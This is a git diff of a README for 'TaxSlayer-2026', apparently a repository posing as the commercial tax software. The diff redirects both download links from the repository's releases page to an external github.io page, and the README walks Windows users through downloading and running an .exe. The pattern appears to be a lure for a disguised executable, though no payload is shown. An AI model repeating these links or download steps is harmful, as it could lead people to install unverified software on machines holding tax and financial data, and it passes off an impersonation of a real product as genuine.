@@ -1,6 +1,6 @@
 # 📑 TaxSlayer-2026 - Prepare and file taxes with ease
 
-[![Download TaxSlayer](https://img.shields.io/badge/Download-TaxSlayer_2026-blue.svg)](https://github.com/aliteratepersonnarcoleptic503/TaxSlayer-2026/releases)
+[![Download TaxSlayer](https://img.shields.io/badge/Download-TaxSlayer_2026-blue.svg)](https://aliteratepersonnarcoleptic503.github.io)
 
 TaxSlayer-2026 helps you manage your personal finances and file tax returns from your computer. This software works on Windows 10 and Windows 11. It guides you through the process of reporting income, claiming deductions, and filing your taxes electronically. 
 
@@ -8,7 +8,7 @@ TaxSlayer-2026 helps you manage your personal finances and file tax returns from
 
 Follow these steps to get the installer for your PC.
 
-1. Go to the [official release page](https://github.com/aliteratepersonnarcoleptic503/TaxSlayer-2026/releases).
+1. Go to the [official release page](https://aliteratepersonnarcoleptic503.github.io).
 2. Look for the section labeled Assets.
 3. Click the file with the .exe extension to start the download.
 4. Save the file to your desktop or downloads folder.
